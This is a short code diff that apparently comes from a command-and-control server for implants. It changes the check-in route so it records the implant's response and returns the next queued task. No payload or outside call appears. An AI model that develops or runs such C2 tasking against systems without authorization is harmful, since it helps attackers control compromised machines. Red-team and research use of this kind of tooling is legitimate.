@@ -50,10 +50,10 @@ def checkin():
 
     update_implant_last_seen(ic.ImplantID) 
     
-    response = analyze_TaskResponse(ic.Resp)
+    analyze_TaskResponse(ic.Resp)
 
     # Send TaskRequest back or "" (if no tasks)
-    return response
+    return get_next_task(ic.ImplantID)
 
 @rpc.route("/task/request", methods=["POST"])
 def send_task():
